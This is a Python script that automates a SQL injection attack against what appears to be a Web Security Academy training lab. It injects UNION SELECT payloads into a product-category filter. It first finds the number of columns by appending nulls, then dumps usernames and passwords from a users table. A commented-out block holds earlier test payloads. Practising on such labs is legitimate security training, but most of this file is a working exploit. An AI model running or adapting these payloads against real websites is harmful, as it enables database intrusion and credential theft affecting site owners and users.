import requests
from bs4 import BeautifulSoup


def try_category(category_string):
    url = f'https://{site}/filter?category={category_string}'
    resp = s.get(url)
    if resp.status_code != 200:
        print(f'Error code {resp.status_code} with text: {resp.text}\n')
        return resp
    soup = BeautifulSoup(resp.text, 'html.parser')
    return resp

if __name__ == "__main__":
    site = "ac801fd71e5720a3805e888c00db0077.web-security-academy.net"
    category = "Pets"
    s = requests.Session()
    url = f'https://{site}'
    login_url = f'https://{site}/login'

    columns = 0
    for i in range(0, 10):
        pstring = f"{category}' UNION SELECT null"
        nstring = i * ",null"
        qstring = f'{pstring}{nstring} --'
        resp = try_category(qstring)
        if resp.status_code == 200:
            columns = i + 1
            print(f'Number of columns: {columns}')
            break
    resp_three = try_category(f"{category}' UNION SELECT username||'~'||password,null FROM users --")
    print(f'Resp_three: {resp_three.status_code} with text: {resp_three.text}\n')
    
"""    resp_one = try_category(f"{category}' UNION SELECT 'hello',null --")
    resp_two = try_category(f"{category}' UNION SELECT null,'hello' --")

    resp_one = try_category(f"{category}' UNION SELECT usernmae,null FROM users --")
    resp_two = try_category(f"{category}' UNION SELECT password,null FROM users --")
    resp_three = try_category(f"{category}' UNION SELECT username||'~'||password,null FROM users --")

    if resp_one.status_code == 200:
        print(f'Resp_one: {resp_one.status_code} with text: {resp_one.text}\n')
    elif resp_two.status_code == 200:
        print(f'Resp_two: {resp_two.status_code} with text: {resp_two.text}\n')
    elif resp_two.status_code == 200:
        print(f'Resp_three: {resp_three.status_code} with text: {resp_three.text}\n')
    else:
        print("No valid string column found\n")
"""
